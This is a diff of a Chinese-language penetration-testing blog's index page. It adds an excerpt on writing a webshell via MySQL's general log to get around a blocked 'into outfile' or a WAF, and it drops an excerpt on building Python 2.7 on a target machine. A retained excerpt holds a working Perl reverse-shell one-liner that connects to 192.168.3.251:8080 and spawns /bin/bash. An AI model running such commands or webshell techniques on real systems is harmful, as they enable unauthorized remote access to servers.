@@ -139,6 +139,38 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2017/03/24/mysql-log-write-webshell/">
+                利用mysql的general log 写shell[突破into outfile]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-03-24</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/webshell/">webshell</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br></p>
+<h5 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;在实际渗透过程中,我们有时可能会遇到这样的情况,明明是正儿八经的mysql root权限,但实际利用into outfile写shell的时候,却写不进去,可以肯定的是,我们对所指定的目标网站目录是绝对有写权限的且mysql的root用户并没有被降权,一般出现这样的情况很可能就是因为into outfile被禁用或waf拦截,希望下面的方式能帮到你<br><br><br><img src="/img/show variables waf.png" alt=""><br><br>
+        </div>
+        <a href="/2017/03/24/mysql-log-write-webshell/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2017/02/20/short-open-tag/">
                 利用php短格式bypasswaf查杀
             </a>
@@ -359,38 +391,6 @@
 <h5 id="首先-可以先尝试利用linux系统现有的各种环境来弹shell"><a href="#首先-可以先尝试利用linux系统现有的各种环境来弹shell" class="headerlink" title="首先,可以先尝试利用linux系统现有的各种环境来弹shell:"></a>首先,可以先尝试利用linux系统现有的各种环境来弹shell:</h5><p>1,利用perl反弹,也是个人比较推荐的方式,因为现在几乎主流的linux发行版都已经预装了perl,你会发现很多大马里面默认也都会选择使用perl<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># perl -e 'use Socket;$i="192.168.3.251";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");&#125;;'</span></div></pre></td></tr></table></figure></p>
         </div>
         <a href="/2016/09/27/revese-shell/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2016/09/26/install-py27-on-centos/">
-                在目标机器上快速编译安装py2.7
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2016-09-26</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/python/">python</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br></p>
-<h5 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;有时迫于无奈,我们需要在目标机器上安装一些自己的工具环境,尤其是linux(默认2.6.6,有些脚本很难跑起来),因为win下的工具已经非常丰富了,这里就不说了<br><br><br>1,编译安装python2.7:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># yum groupinstall "Development tools" -y</span></div><div class="line"><span class="comment"># yum install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel -y</span></div><div class="line"><span class="comment"># wget https://www.python.org/ftp/python/2.7.11/Python-2.7.11.tgz</span></div><div class="line"><span class="comment"># tar -xf Python-2.7.11.tgz</span></div><div class="line"><span class="comment"># # cd Python-2.7.11</span></div><div class="line"><span class="comment"># ./configure --prefix=/usr/local</span></div><div class="line"><span class="comment"># make &amp;&amp; make install</span></div><div class="line"><span class="comment"># echo $?</span></div><div class="line"><span class="comment"># python2.7</span></div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;</span>&gt; import sys</div><div class="line"><span class="meta">&gt;&gt;</span>&gt; sys.version</div></pre></td></tr></table></figure></p>
-        </div>
-        <a href="/2016/09/26/install-py27-on-centos/" class="read-more">Read More</a>
     
 
 </div>
